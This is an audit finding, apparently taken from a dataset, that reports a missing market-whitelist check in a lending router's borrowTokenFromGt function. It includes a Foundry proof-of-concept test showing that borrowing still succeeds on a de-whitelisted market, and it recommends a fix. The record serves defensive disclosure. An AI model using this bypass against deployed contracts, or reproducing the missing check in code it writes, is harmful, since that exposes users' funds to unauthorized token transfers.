# [M] Missing Market Whitelist Modifier in borrowTokenFromGt

## Summary
Severity: Medium
Reporter: 0xNull, also found by BengalCatBalu and korok
Contest weight: 0.4759
Dataset id: 4989
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The borrowTokenFromGt function, which is used for borrowing tokens from a specific market, does not use the ensureMarketWhitelist modifier, which should be applied in every function interacting with the market. This allows users to invoke this function on markets that are not part of the whitelist.
This issue allows individuals to use this function and its logic in unauthorized markets.

Impact Explanation:
impact is high Because this issue could lead to the following:
• Transfer of unauthorized tokens.
• Lending or loss of tokens.

## Proof of Concept
The market whitelist status has been set to false, and the execution completes successfully:
```solidity
function testBorrowTokenFromGt() public {
    vm.startPrank(deployer);
    res.router.setMarketWhitelist(address(res.market), false);
    vm.stopPrank();
    vm.startPrank(sender);
    uint256 collInAmt = 1e18;
    (uint256 gtId,) = LoanUtils.fastMintGt(res, sender, 100e8, collInAmt);
    uint128 borrowAmt = 80e8;
    res.debt.mint(sender, borrowAmt);
    res.debt.approve(address(res.market), borrowAmt);
    res.market.mint(sender, borrowAmt);
    res.xt.approve(address(res.router), borrowAmt);
    res.gt.approve(address(res.router), gtId);
    uint256 issueFtFeeRatio = res.market.issueFtFeeRatio();
    uint128 previewDebtAmt =
        ((borrowAmt * Constants.DECIMAL_BASE) / (Constants.DECIMAL_BASE - issueFtFeeRatio)).toUint128();
    vm.expectEmit();
    emit RouterEvents.Borrow(res.market, 1, sender, sender, 0, previewDebtAmt, borrowAmt);
    res.router.borrowTokenFromGt(sender, res.market, gtId, borrowAmt);
    (, uint128 debtAmt,,) = res.gt.loanInfo(gtId);
    assert(debtAmt == 100e8 + previewDebtAmt);
    assertEq(res.debt.balanceOf(sender), borrowAmt);
    vm.stopPrank();
}
```

## Recommendation
Consider adding the ensureMarketWhitelist modifier to prevent this vulnerability.
